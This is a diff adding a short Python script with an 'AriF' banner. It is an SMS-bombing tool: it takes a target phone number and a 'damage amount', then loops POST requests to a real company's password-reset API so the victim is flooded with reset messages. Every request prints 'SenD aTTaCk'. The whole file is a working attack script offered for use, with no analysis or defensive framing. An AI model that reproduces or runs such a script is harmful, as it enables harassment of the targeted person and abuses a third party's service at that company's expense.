@@ -1,0 +1,55 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+
+green = '\033[1;36m'
+end = '\033[0m'
+print (green+"""
+               AAA                                   iiii  FFFFFFFFFFFFFFFFFFFFFF
+              A:::A                                 i::::i F::::::::::::::::::::F
+             A:::::A                                 iiii  F::::::::::::::::::::F
+            A:::::::A                                      FF::::::FFFFFFFFF::::F
+           A:::::::::A          rrrrr   rrrrrrrrr  iiiiiii   F:::::F       FFFFFF
+          A:::::A:::::A         r::::rrr:::::::::r i:::::i   F:::::F             
+         A:::::A A:::::A        r:::::::::::::::::r i::::i   F::::::FFFFFFFFFF   
+        A:::::A   A:::::A       rr::::::rrrrr::::::ri::::i   F:::::::::::::::F   
+       A:::::A     A:::::A       r:::::r     r:::::ri::::i   F:::::::::::::::F   
+      A:::::AAAAAAAAA:::::A      r:::::r     rrrrrrri::::i   F::::::FFFFFFFFFF   
+     A:::::::::::::::::::::A     r:::::r            i::::i   F:::::F             
+    A:::::AAAAAAAAAAAAA:::::A    r:::::r            i::::i   F:::::F             
+   A:::::A             A:::::A   r:::::r           i::::::iFF:::::::FF           
+  A:::::A               A:::::A  r:::::r           i::::::iF::::::::FF           
+ A:::::A                 A:::::A r:::::r           i::::::iF::::::::FF           
+AAAAAAA                   AAAAAAArrrrrrr           iiiiiiiiFFFFFFFFFFF """+end)
+
+# CVALUE
+blue = '\33[94m'
+pink = '\033[95m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan = "\033[96m"
+end = '\033[0m'
+print ("\033[32m")
+
+print(pink+"---------------------------------------")
+print(cyan+"YouR NeeD To LOgiN BeFor uSe THe TooLs")
+print(pink+"---------------------------------------")
+
+number=str(input(cyan+"[>] Enter Your Target Number:"+green))
+
+amount = int(input(cyan+"[>] Enter Your Damage Amount:"+green))
+
+url = "https://api.biddabari.com/api/login/reset"
+
+headers = CaseInsensitiveDict()
+headers["Content-Type"] = "application/json"
+
+data = '{"phone":"'+number+'"}'
+
+
+for i in range (amount):
+	requests.post(url, headers=headers, data=data)
+	
+	print(blue+str (i+1)+" SenD aTTaCk \n")
+			
